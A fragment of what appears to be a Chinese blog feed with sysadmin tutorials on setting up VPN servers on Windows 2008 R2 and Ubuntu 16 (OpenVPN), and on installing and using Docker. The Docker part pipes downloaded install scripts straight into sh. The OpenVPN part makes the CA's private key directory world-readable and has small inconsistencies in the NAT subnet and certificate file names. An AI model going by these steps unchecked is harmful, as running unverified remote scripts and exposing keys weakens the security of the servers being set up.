</p><p><img src="/2019/02/07/搭建OpenVPN服务(Windows-2008-R2)/Windows-2008-R2-搭建VPN服务/wps14.jpg" alt="img"> </p><ol start="13"><li>创建VPN帐号，测试VPN服务器是否正常。在计算机右键管理，选择配置，本地用户和组，还要把拨入属性选项卡中的网络访问权限选择为 允许访问。</li></ol><p><img src="/2019/02/07/搭建OpenVPN服务(Windows-2008-R2)/Windows-2008-R2-搭建VPN服务/wps15.jpg" alt="img"> </p><ol start="14"><li>至此，完成了VPN服务器端的配置</li></ol><h1 id="三、连接测试"><a href="#三、连接测试" class="headerlink" title="三、连接测试"></a>三、连接测试</h1><p>​    使用另外一台不同网段的机器，新建VPN拨号连接，登录VPN服务器上的测试帐号</p><ol><li>配置连接属性</li></ol><p><img src="/2019/02/07/搭建OpenVPN服务(Windows-2008-R2)/Windows-2008-R2-搭建VPN服务/wps16.jpg" alt="img"> </p><ol start="2"><li>开始连接 </li></ol><p><img src="/2019/02/07/搭建OpenVPN服务(Windows-2008-R2)/Windows-2008-R2-搭建VPN服务/wps17.jpg" alt="img"> </p><ol start="3"><li>连接成功 </li></ol><p><img src="/2019/02/07/搭建OpenVPN服务(Windows-2008-R2)/Windows-2008-R2-搭建VPN服务/wps18.jpg" alt="img"> </p><ol start="4"><li>查看IP </li></ol><p><img src="/2019/02/07/搭建OpenVPN服务(Windows-2008-R2)/Windows-2008-R2-搭建VPN服务/wps19.jpg" alt="img"> </p><ol start="5"><li>本机IP </li></ol><p><img src="/2019/02/07/搭建OpenVPN服务(Windows-2008-R2)/Windows-2008-R2-搭建VPN服务/wps20.jpg" alt="img"> </p><p>至此，完成了VPN客户端的连接</p>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VPN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建OpenVPN服务(Ubuntu16)</title>
      <link href="/2019/02/07/%E6%90%AD%E5%BB%BAOpenVPN%E6%9C%8D%E5%8A%A1(Ubuntu16)/"/>
      <url>/2019/02/07/%E6%90%AD%E5%BB%BAOpenVPN%E6%9C%8D%E5%8A%A1(Ubuntu16)/</url>
      
        <content type="html"><![CDATA[<h2 id="一、参考"><a href="#一、参考" class="headerlink" title="一、参考"></a>一、参考</h2><p><a href="https://blog.csdn.net/u012843189/article/details/77422505" target="_blank" rel="noopener">Ubuntu16.04搭建OpenVPN</a><br><a href="https://cndaqiang.github.io/2017/09/27/ubuntu1604-openvpn/" target="_blank" rel="noopener">Ubuntu16.04搭建openvpn服务器</a></p><h2 id="二、环境"><a href="#二、环境" class="headerlink" title="二、环境"></a>二、环境</h2><p>Ubuntu 16.10 yakkety (GNU/Linux 4.8.0-22-generic x86_64)</p><h2 id="三、介绍"><a href="#三、介绍" class="headerlink" title="三、介绍"></a>三、介绍</h2><p><strong>VPN</strong>（Virtual Private Network，虚拟私人网络）是一种常用于连接中、大型企业或团体与团体间的私人网络的通讯方法。它利用<a href="https://zh.wikipedia.org/wiki/%E9%9A%A7%E9%81%93%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">隧道协议</a>（Tunneling Protocol）来达到保密、发送端认证、消息准确性等私人消息安全效果，这种技术可以用不安全的网络（例如：互联网）来发送可靠、安全的消息。</p><h2 id="四、安装"><a href="#四、安装" class="headerlink" title="四、安装"></a>四、安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install openvpn easy-rsa</span><br></pre></td></tr></table></figure><a id="more"></a><p><code>easy-rsa</code>内部CA（certificate authority）证书生成软件</p><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554386400868.png" alt="1554386400868"></p><h2 id="五、证书制作"><a href="#五、证书制作" class="headerlink" title="五、证书制作"></a>五、证书制作</h2><h3 id="1-证书配置"><a href="#1-证书配置" class="headerlink" title="1. 证书配置"></a>1. 证书配置</h3><p>复制证书制作工具到文件夹(该文件夹应该不存在，复制后自动创建该文件夹)，<code>make-cadir</code>为easy-rsa安装后增加的命令 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make-cadir /etc/openvpn/ca</span><br><span class="line">cd /etc/openvpn/ca</span><br></pre></td></tr></table></figure><p>更改证书默认设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim vars</span><br></pre></td></tr></table></figure><p>以下内容为证书的默认内容，可自定义，不能为空</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">export KEY_COUNTRY=&quot;US&quot;</span><br><span class="line">export KEY_PROVINCE=&quot;CA&quot;</span><br><span class="line">export KEY_CITY=&quot;SanFrancisco&quot;</span><br><span class="line">export KEY_ORG=&quot;Fort-Funston&quot;</span><br><span class="line">export KEY_EMAIL=&quot;me@myhost.mydomain&quot;</span><br><span class="line">export KEY_OU=&quot;MyOrganizationalUnit&quot;</span><br></pre></td></tr></table></figure><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554386592562.png" alt="1554386592562"></p><p>下面有个KEY_NAME，值可自定义，例如heiheihei</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KEY_NAME=&quot;heiheihei&quot;</span><br></pre></td></tr></table></figure><p>保存退出</p><p>现在可以使用刚才设置的变量，用easy-rsa包来制作CA。确保在CA目录下面，然后source编辑过的vars文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source vars</span><br></pre></td></tr></table></figure><p>如果source正确的话，会看到如下信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NOTE: If you run ./clean-all, I will be doing a rm -rf on /etc/openvpn/ca/keys</span><br></pre></td></tr></table></figure><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554386666693.png" alt="1554386666693"></p><h3 id="2-CA证书"><a href="#2-CA证书" class="headerlink" title="2. CA证书"></a>2. CA证书</h3><p>CA数字证书认证机构,负责颁发证书，用于openvpn服务器和客户端的认证</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./clean-all//确保我们的操作处于一个clean环境中</span><br><span class="line">./build-ca//之后需要一直回车确认</span><br><span class="line">./build-ca [--batch]//保持默认设置，无须回车确认</span><br></pre></td></tr></table></figure><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554387418885.png" alt="1554387418885"></p><h3 id="3-服务器证书"><a href="#3-服务器证书" class="headerlink" title="3. 服务器证书"></a>3. 服务器证书</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./build-key-server --batch heiheihei</span><br></pre></td></tr></table></figure><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554429618321.png" alt="1554429618321"></p><p>heiheihei为之前vars里<code>export KEY_NAME=&quot;heiheihei&quot;</code>的值，自定义后，后面需要修改服务器配置文件中相应内容。</p><p>client名称也可自定义,如果修改，最后在客户端配置文件中，也更改对应名称。</p><h3 id="4-制作Diffie-Hellman-key"><a href="#4-制作Diffie-Hellman-key" class="headerlink" title="4. 制作Diffie-Hellman key"></a>4. 制作Diffie-Hellman key</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./build-dh</span><br></pre></td></tr></table></figure><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554429922860.png" alt="1554429922860"></p><p>等待几分钟时间完成</p><h3 id="5-生成HMAC签名加强TLS认证"><a href="#5-生成HMAC签名加强TLS认证" class="headerlink" title="5. 生成HMAC签名加强TLS认证"></a>5. 生成HMAC签名加强TLS认证</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openvpn --genkey --secret keys/ta.key</span><br></pre></td></tr></table></figure><h3 id="6-客户端证书"><a href="#6-客户端证书" class="headerlink" title="6. 客户端证书"></a>6. 客户端证书</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./build-key --batch client</span><br></pre></td></tr></table></figure><p>client名称可自定义,如果修改需要后面在客户端配置文件中，更改对应内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cert client.crt</span><br><span class="line">key client.key</span><br></pre></td></tr></table></figure><h2 id="六、服务端配置"><a href="#六、服务端配置" class="headerlink" title="六、服务端配置"></a>六、服务端配置</h2><h3 id="1-移动证书"><a href="#1-移动证书" class="headerlink" title="1. 移动证书"></a>1. 移动证书</h3><p>进入keys目录可以看到生成的证书文件 我们需要<strong>ca.crt ca.key heiheihei.crt heiheihei.key ta.key dh2048.pem</strong> ，heiheihei为之前自定义的服务器证书名</p><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554430607611.png" alt="1554430607611"></p><p>复制证书文件到/etc/openvpn 当前目录是<code>/etc/openvpn/ca/keys</code>，所以<code>../../</code>就是配置目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ca.crt ca.key uuu.crt uuu.key ta.key dh2048.pem ../../</span><br></pre></td></tr></table></figure><h3 id="2-修改配置文件"><a href="#2-修改配置文件" class="headerlink" title="2. 修改配置文件"></a>2. 修改配置文件</h3><p>复制配置文件模板到<code>/etc/openvpn/</code>,解压后修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/doc/openvpn/examples/sample-config-files/server.conf.gz .</span><br><span class="line">gzip -d server.conf.gz</span><br><span class="line">sudo vim server.conf</span><br></pre></td></tr></table></figure><p>以下内容替换为证书的路径名称，同路径下可直接写名称</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ca ca.crt</span><br><span class="line">cert server.crt</span><br><span class="line">key server.key </span><br><span class="line"></span><br><span class="line">dh dh2048.pem</span><br></pre></td></tr></table></figure><p>这里我替换成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ca ca.crt</span><br><span class="line">cert heiheihei.crt</span><br><span class="line">key heiheihei.key</span><br><span class="line"></span><br><span class="line">dh dh2048.pem</span><br></pre></td></tr></table></figure><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554430900402.png" alt="1554430900402"></p><p>如果服务器证书一开始就命名为server默认值，这里就不用修改了</p><p>去掉下面的注释，并再下一行添加<code>key-direction 0</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;tls-auth ta.key 0 # This file is secret</span><br></pre></td></tr></table></figure><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554431450577.png" alt="1554431450577"></p><p>最后，找到user和group参数，去除它们之前的<code>;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;user nobody</span><br><span class="line">;group nogroup</span><br></pre></td></tr></table></figure><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554431475663.png" alt="1554431475663"></p><p><strong>（可选配置）推动DNS更改让VPN重定向所有流量</strong></p><p>上面的配置可以在客户端和服务器端上创建VPN连接，但是没有强迫连接去使用tunnel。如果希望用VPN来路由所有流量，需要更改客户端机器的DNS设置。</p><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554431815982.png" alt="1554431815982"></p><p>这样就可以协助客户版重新配置DNS，以便使用VPN tunnel来作为默认网关。</p><p><strong>（可选配置）修改OpenVPN服务器的端口和协议</strong></p><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554431906735.png" alt="1554431906735"></p><p>如果没有更换端口的需求，最好将上述的两项保持默认设置。</p><h3 id="3-防火墙设置"><a href="#3-防火墙设置" class="headerlink" title="3. 防火墙设置"></a>3. 防火墙设置</h3><h4 id="1-打开ip转发"><a href="#1-打开ip转发" class="headerlink" title="1. 打开ip转发"></a>1. 打开ip转发</h4><p>我们需要让服务器来转发流量，这是需要VPN服务器来提供的最基本的功能。可以通过修改/etc/sysctl.conf文件来调整网络设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/sysctl.conf</span><br></pre></td></tr></table></figure><p>取消注释<code>net.ipv4.ip_forward</code>，完成后保存并退出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.ipv4.ip_forward=1</span><br></pre></td></tr></table></figure><p>读取sysctl.conf文件并且让调整后设置对当前系统的session生效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -p</span><br></pre></td></tr></table></figure><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554432065420.png" alt="1554432065420"></p><h4 id="2-添加规则"><a href="#2-添加规则" class="headerlink" title="2. 添加规则"></a>2. 添加规则</h4><p><strong>调整防火墙（UFW）规则</strong></p><p>配置防火墙规则来引导进入服务器的一些流量，需要修改防火墙规则文件来建立伪装规则，iptables的概念用于提供动态的NAT，从而正确地路由客户端连接。在打开防火墙配置文件以添加伪装规则之前，需要找到Ubuntu服务器的公共网络接口，输入如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip route | grep default</span><br></pre></td></tr></table></figure><p>公共网络接口应当紧跟在单词”dev”后面，例如，我的接口名字为ens33：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default via 172.18.31.253 dev ens33</span><br></pre></td></tr></table></figure><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554432573267.png" alt="1554432573267"></p><p>打开/etc/ufw/before.rules这个文件并添加相应的规则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/ufw/before.rules</span><br></pre></td></tr></table></figure><p>在最前面填入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># START OPENVPN RULES</span><br><span class="line"># NAT table rules</span><br><span class="line">*nat</span><br><span class="line">:POSTROUTING ACCEPT [0:0] </span><br><span class="line"># Allow traffic from OpenVPN client to eth0</span><br><span class="line">-A POSTROUTING -s 10.8.0.0/8 -o ens33 -j MASQUERADE</span><br><span class="line">COMMIT</span><br><span class="line"># END OPENVPN RULES</span><br></pre></td></tr></table></figure><p>其中10.8.0.0/8为openvpn客户端获取的ip，如在server.conf里面修改，此处应替换为相应ip，ens33为ubuntu连接网络的网卡</p><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554432778966.png" alt="1554432778966"></p><p>然后告诉防火墙默认允许转发包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/default/ufw</span><br></pre></td></tr></table></figure><p>将</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DEFAULT_FORWARD_POLICY=&quot;DROP&quot;</span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DEFAULT_FORWARD_POLICY=&quot;ACCEPT&quot;</span><br></pre></td></tr></table></figure><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554432909071.png" alt="1554432909071"></p><h4 id="3-开放端口"><a href="#3-开放端口" class="headerlink" title="3. 开放端口"></a>3. 开放端口</h4><p><strong>打开OpenVPN端口并且使变化生效</strong></p><p>调整防火墙本身，以允许流量到OpenVPN。如果在/etc/openvpn/server.conf文件中没有修改OpenVPN的端口号和协议类型，那么直接配置防火墙允许UDP流量到1194端口，如果改变了端口和协议类型，那么根据自己设置的端口和协议类型进行配置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw allow 1194/udp</span><br><span class="line">sudo ufw allow OpenSSH</span><br></pre></td></tr></table></figure><p>  从所有修改过的文件中装载配置来关闭和重启防火墙：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw disable</span><br><span class="line">sudo ufw enable</span><br></pre></td></tr></table></figure><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554433320308.png" alt="1554433320308"></p><p>至此服务器端可以正确地处理OpenVPN流量了。</p><h2 id="七、启动OpenVPN服务"><a href="#七、启动OpenVPN服务" class="headerlink" title="七、启动OpenVPN服务"></a>七、启动OpenVPN服务</h2><p>在systemd单元文件的后面，可以通过指定特定的配置文件名来作为一个实例变量来开启OpenVPN服务，我们的配置文件名称为/etc/openvpn/server.conf，所以在systemd单元文件的后面添加@server来开启OpenVPN服务:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start openvpn@server</span><br><span class="line">sudo systemctl status openvpn@server</span><br></pre></td></tr></table></figure><p>如果一切正常的话，输出应当跟如下类似:</p><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554433559377.png" alt="1554433559377"></p><p>通过<code>ifconfig</code>可以查看新增的ip为<code>inet addr:10.8.0.1</code>的<code>tun0</code>网卡</p><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554433627533.png" alt="1554433627533"></p><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr show tun0</span><br></pre></td></tr></table></figure><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554433680420.png" alt="1554433680420"></p><p>如果一切运行正常，将OpenVPN设置为开机自启动：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl enable openvpn@server</span><br></pre></td></tr></table></figure><h2 id="八、客户端配置"><a href="#八、客户端配置" class="headerlink" title="八、客户端配置"></a>八、客户端配置</h2><p><strong>制作客户端配置文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/openvpn/ca/keys</span><br><span class="line">cp /usr/share/doc/openvpn/examples/sample-config-files/client.conf .</span><br></pre></td></tr></table></figure><p>因为是一直root权限操作，所以ubuntu普通用户没有访问证书目录的权限，可赋予普通用户读取权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R +rx /etc/openvpn/ca/</span><br></pre></td></tr></table></figure><p>用scp等方法将keys中的客户端证书文件复制到客户端上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ca.crt</span><br><span class="line">ta.key </span><br><span class="line">client.crt </span><br><span class="line">client.key </span><br><span class="line">client.conf</span><br></pre></td></tr></table></figure><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554434147405.png" alt="1554434147405"></p><p>打开client.conf 将<code>remote my-server-1 1194</code>中<code>my-server-1</code> <code>1194</code>替换为服务器的ip/域名，端口，并去掉前面的分号</p><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554434551477.png" alt="1554434551477"></p><p>去掉前面的分号</p><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554434461184.png" alt="1554434461184"></p><p>设置证书地址,如果自定义了客户端证书名称自行更改</p><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554434518742.png" alt="1554434518742"></p><p>删掉分号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;tls-auth ta.key 1</span><br></pre></td></tr></table></figure><p>并在下一行添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key-direction 1</span><br></pre></td></tr></table></figure><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554434639408.png" alt="1554434639408"></p><p>把client.conf命名为client.ovpn，然后将<strong>ca.crt ta.key client.crt client.key client.ovpn</strong>复制到客户端配置文件目录（此为windows环境下）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\OpenVPN\config</span><br></pre></td></tr></table></figure><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554434791663.png" alt="1554434791663"></p><h2 id="九、连接测试"><a href="#九、连接测试" class="headerlink" title="九、连接测试"></a>九、连接测试</h2><p>客户端可访问官网（需要FQ），或者通过第三方渠道下载安装</p><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554435021629.png" alt="1554435021629"></p><p>如图连接成功</p><p><img src="/2019/02/07/搭建OpenVPN服务(Ubuntu16)/Ubuntu16下搭建OpenVPN服务/1554438169932.png" alt="1554438169932"></p><p>以上就是openvpn服务的搭建过程，如有不对遗漏之处，还望斧正，谢谢。</p>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VPN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker部署操作实例</title>
      <link href="/2018/08/28/Docker%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C%E5%AE%9E%E4%BE%8B/"/>
      <url>/2018/08/28/Docker%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C%E5%AE%9E%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="一、docker介绍"><a href="#一、docker介绍" class="headerlink" title="一、docker介绍"></a>一、docker介绍</h1><p>docker是开源的应用程序容器引擎，使用go语言开发，借助于docker打包用户的应用程序，将这些应用程序包含在容器中，实现虚拟化，容器是完全使用沙箱机制，相互独立，占用资源非常少。</p><a id="more"></a><h1 id="二、docker三大核心概念"><a href="#二、docker三大核心概念" class="headerlink" title="二、docker三大核心概念"></a>二、docker三大核心概念</h1><ul><li><p>镜像</p><ul><li>image, docker镜像就是一个只读的模板，例如一个镜像中可以包含完整的操作系统，里面安装apache/php/mysql等环境，镜像可以创建容器</li></ul></li><li><p>容器</p><ul><li>container，docker利用容器运行程序，容器是从镜像中创建运行的实例，容器可以运行、关闭、删除</li></ul></li><li>仓库<ul><li>repository，集中存放镜像的地方，每个仓库中包含多个镜像，分为私有和公开，dockerHub</li></ul></li></ul><h1 id="三、docker安装"><a href="#三、docker安装" class="headerlink" title="三、docker安装"></a>三、docker安装</h1><h2 id="1-一键安装Docker"><a href="#1-一键安装Docker" class="headerlink" title="1. 一键安装Docker"></a>1. 一键安装Docker</h2><ol><li><p>这是推荐方式。在未安装过Docker的机器上，root权限执行如下命令即可一键安装最新版Docker：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure></li><li><p>也可以使用系统自带的包管理工具来安装，比如在Ubuntu下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker.io</span><br></pre></td></tr></table></figure></li></ol><h2 id="2-手动安装"><a href="#2-手动安装" class="headerlink" title="2.手动安装"></a>2.手动安装</h2><p>常见操作系统安装Docker的方法在文档中均可查阅，这里就不再赘述： <a href="https://docs.docker.com/engine/installation/" target="_blank" rel="noopener">https://docs.docker.com/engine/installation/</a></p><p><strong>注意</strong>，docker是一个系统服务，所以，安装完成后可能需要手工启动服务：<code>service start docker</code>，否则会出现连接失败的情况。同样，如果docker没有自启动，你也需要手工启动docker服务。如果你是使用一键安装工具安装的docker，则docker会自动启动。</p><h2 id="3-加入docker组"><a href="#3-加入docker组" class="headerlink" title="3. 加入docker组"></a>3. 加入docker组</h2><p>安装完成之后，普通用户每次执行docker命令都需要加上<code>sudo</code> ，所以我们可以加入doker用户组获取操作权限</p><ol><li><p>使用有sudo权限的帐号登录系统</p></li><li><p>创建docker分组，并将相应的用户添加到这个分组里面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -aG docker your_username</span><br></pre></td></tr></table></figure></li><li><p>退出，然后重新登录，以便让权限生效</p></li></ol><h2 id="4-添加国内镜像仓库"><a href="#4-添加国内镜像仓库" class="headerlink" title="4. 添加国内镜像仓库"></a>4. 添加国内镜像仓库</h2><p>由于官方资源库在国外，我们在拉取镜像资源的时候会很慢。所以，国内的Docker爱好者们就添加了一些国内的镜像（mirror）,方便大家使用。</p><p><strong>国内加速站点</strong></p><ul><li><p><a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors" target="_blank" rel="noopener">阿里云</a></p></li><li><p><a href="https://c.163yun.com/hub#/m/home/" target="_blank" rel="noopener">网易云</a></p></li><li><p><a href="https://www.daocloud.io/mirror" target="_blank" rel="noopener">DaoCloud</a></p></li></ul><ol><li><p>使用脚本来配置加速站点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io</span><br></pre></td></tr></table></figure></li><li><p>使用命令来配置加速站点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&apos;EOF&apos;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;&lt;your accelerate address&gt;&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>以上操作后重启一下 Docker</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker restart</span><br></pre></td></tr></table></figure></li></ol><h1 id="五、docker基本使用"><a href="#五、docker基本使用" class="headerlink" title="五、docker基本使用"></a>五、docker基本使用</h1><h2 id="1-启动docker"><a href="#1-启动docker" class="headerlink" title="1. 启动docker"></a>1. 启动docker</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker//centos</span><br><span class="line">server docker start//ubuntu</span><br></pre></td></tr></table></figure><p><strong>查看基本信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker info//当前容器的信息</span><br><span class="line">docker stats//运行容器的进程信息</span><br><span class="line">docker version//版本信息</span><br></pre></td></tr></table></figure><h2 id="2-镜像操作"><a href="#2-镜像操作" class="headerlink" title="2. 镜像操作"></a>2. 镜像操作</h2><p><strong>搜索镜像</strong></p><figure class="highlight 